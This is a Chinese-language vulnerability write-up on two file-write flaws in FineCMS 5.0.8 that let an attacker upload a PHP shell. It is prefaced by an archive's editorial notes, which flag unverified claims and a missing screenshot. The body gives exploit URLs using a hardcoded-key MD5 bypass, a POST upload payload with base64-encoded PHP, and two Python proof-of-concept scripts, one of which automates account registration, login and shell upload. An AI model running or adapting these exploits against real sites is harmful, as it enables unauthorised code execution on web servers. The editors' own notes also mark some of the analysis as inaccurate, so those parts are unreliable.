---
source: "白阁文库 BaizeSec/bylibrary"
product: "FineCMS5.0.8"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "FineCMS_v5.0.8两处getshell"
prerequisites: "来源所述条件，未列明部分仍待核：第一入口需可预测/默认SYS_KEY；第二需注册会员；上传目录执行PHP"
side_effects: "未执行；本文需注意的操作影响：与172同文主体，两条漏洞分别API默认密钥与会员头像上传，应独立关联"
source_status: "unknown"
id: "vw-d090f4eae1acbe2410a4e397"
entity_id: "ve-d090f4eae1acbe2410a4e397"
schema_version: "1"
---

## 核对与使用边界

- 明确缺图：原文 HTML 引用 `FineCMS最新版5.0.8两处getshell/2.png` 未在基线 Git 树中找到；对应资源只有 1.png、3.png，截图 2 需回原源补齐。本次保留该引用，不猜造图像，也不称所有图片完整。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：第一入口需可预测/默认SYS_KEY；第二需注册会员；上传目录执行PHP

- **适用与权限边界（1）**：与172同文主体，两条漏洞分别API默认密钥与会员头像上传，应独立关联。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（2）**：SYS_KEY硬编码是否所有安装统一未给安装生成逻辑；base64描述把移除的result\[1\]误当解码对象。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（3）**：第一脚本200且code子串、第二只status键判成功均不证明PHP执行，第二未取实际shell路径。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（4）**：HTML img使用旧相对目录（非Markdown图片统计范围）需Git树另核对；末尾github无实际链接。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# FineCMS_v5.0.8两处getshell

## 0x01 前言

就要被**，美其名曰：比我的web安全研究和代码审计更有前途。当然是选择原谅他啦。
先审计finecms去去火，找到六处漏洞，先放两处容易被发现的getshell和对应的两个python脚本

## 0x02 getshell

**第一处getshell**：在C:/phpStudy/WWW/finecms/dayrui/controllers/Api.php中的data2函数，大约在第115行，有问题的代码大约在178行

```
public function data2() {

    $data = array();

    // 安全码认证
    $auth = $this->input->get('auth', true);
    if ($auth != md5(SYS_KEY)) {
        // 授权认证码不正确
        $data = array('msg' => '授权认证码不正确', 'code' => 0);
    } else {
        // 解析数据
        $cache = '';
        $param = $this->input->get('param');
        if (isset($param['cache']) && $param['cache']) {
            $cache = md5(dr_array2string($param));
            $data = $this->get_cache_data($cache);
        }
        if (!$data) {

            if ($param == 'login') {
                // 登录认证
                $code = $this->member_model->login(
                    $this->input->get('username'),
                    $this->input->get('password'),
                    0, 1);
                if (is_array($code)) {
                    $data = array(
                        'msg' => 'ok',
                        'code' => 1,
                        'return' => $this->member_model->get_member($code['uid'])
                    );
                } elseif ($code == -1) {
                    $data = array('msg' => fc_lang('会员不存在'), 'code' => 0);
                } elseif ($code == -2) {
                    $data = array('msg' => fc_lang('密码不正确'), 'code' => 0);
                } elseif ($code == -3) {
                    $data = array('msg' => fc_lang('Ucenter注册失败'), 'code' => 0);
                } elseif ($code == -4) {
                    $data = array('msg' => fc_lang('Ucenter：会员名称不合法'), 'code' => 0);
                }
            } elseif ($param == 'update_avatar') {
                // 更新头像
                $uid = (int)$_REQUEST['uid'];
                $file = $_REQUEST['file'];
                //
                // 创建图片存储文件夹
                $dir = SYS_UPLOAD_PATH.'/member/'.$uid.'/';
                @dr_dir_delete($dir);
                if (!is_dir($dir)) {
                    dr_mkdirs($dir);
                }
                $file = str_replace(' ', '+', $file);
                if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
                    $new_file = $dir.'0x0.'.$result[2];
                    if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                        $data = array(
                            'msg' => '目录权限不足或磁盘已满',
                            'code' => 0
                        );
                    }
```

其中，首先

```
$file = $_REQUEST['file'];
```

获取$file变量

```
if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
                        $new_file = $dir.'0x0.'.$result[2];
                        if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                            $data = array(
                                'msg' => '目录权限不足或磁盘已满',
                                'code' => 0
                            );
```

然后用preg_match函数进行正则匹配，因为$file变量可控，所以$result也是可控的，从而$new_file也是可控的，可以构造为php文件，然后

```
file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file))))
```

对$result[1]进行base64解码，然后写入$new_file文件中。显然，是可以任意写文件进行getshell的。所以，我们要让程序能够运行到这些代码，不能在之前就退出了。要经过

```
 $auth = $this->input->get('auth');
 if ($auth != md5(SYS_KEY))
```

SYS_KEY被系统硬编码为24b16fede9a67c9251d3e7c7161c83ac，在C:phpStudyWWWconfigsystem.php中有定义。直接md5加密一次即可绕过

所以最终的payload为

```
http://localhost:88/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+
```

无需登录，直接getshell,路径为http://localhost:88/uploadfile/member/0/0x0.php
![1](./.resource/FineCMS_v5.0.8两处getshell/media/1.png)

**第二处getshell**：在文件C:/phpStudy/WWW/finecms/dayrui/controllers/member/Account.php中的upload函数

```php
if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
                $new_file = $dir.'0x0.'.$result[2];
                if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                    exit(dr_json(0, '目录权限不足或磁盘已满'));
                
```

注册会员，登录

```
访问：http://localhost:88/index.php?s=member&c=account&m=upload
POST：tx=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+
```

<img src="FineCMS最新版5.0.8两处getshell/2.png" alt="2" style="zoom:75%;" />

![3](./.resource/FineCMS_v5.0.8两处getshell/media/3.png)

## 0x03 Python批量poc脚本

pocsuite和poc-T是两个成熟的poc框架，不过感觉核心代码是别人的，只写一些poc插件的话，就是为别人造轮子，所以抽了一些代码写了个自己的工具，可能连轻型框架都算不上，只够自己用的。
第一处getshell的python代码（因为是直接getshell，无需登录，所以很简单）：

```python
import sys
import requests
def poc(target):
    payload="/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+"
    url=target+payload
    shell=target+'/uploadfile/member/0/0x0.php'
    try:
        result=requests.get(url,timeout=3)
        verify=requests.get(shell,timeout=3)
        if verify.status_code==200 and 'code' in verify.text:
            return True
    except Exception,e:
        print e
```

第二处getshell的Python代码（需要自动化注册、登录、利用）：

```python
#Finecms version:5.0.8
#Author:404notfound

import random
import sys
import requests
def poc(url):
    username=random.randint(0,999999)
    seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    email = []
    for i in range(8):
        email.append(random.choice(seed))
    email = ''.join(email)
    #print email+"@"+email+".com"
    #print username
    
    #step 1 register
    #print "[+] register user"
    register_url=url+"/index.php?s=member&c=register&m=index"
    register_payload={"back":"","data[username]":username,"data[password]":"123456","data[password2]":"123456","data[email]":email+"@"+email+".com"}
    #step 2 login
    #print "[+] user login"
    login_url=url+"/index.php?s=member&c=login&m=index"
    login_payload={"back":"","data[username]":username,"data[password]":"123456","data[auto]":"1"}
    #step 3 attack
    #print "[+] loading payload"
    vul_url=url+"/index.php?s=member&c=account&m=upload"
    vul_payload={"tx":"data:image/php;base64,NDA0bm90Zm91bmQ8P3BocCBwaHBpbmZvKCk7Pz4="}
    try:
        s = requests.session()
        resu=s.post(register_url,data=register_payload)
        result=s.post(login_url,data=login_payload)
        result2=s.post(vul_url,data=vul_payload).content
        if "status" in result2:
            return True
        else:
            return False
    except Exception,e:
        pass
        #print e
    #print "[+] ALL DONE"
    #step 4 find shell path
       
#print poc("http://localhost")
```

get脚本github访问获取


---

> 来源：白阁文库 BaizeSec/bylibrary
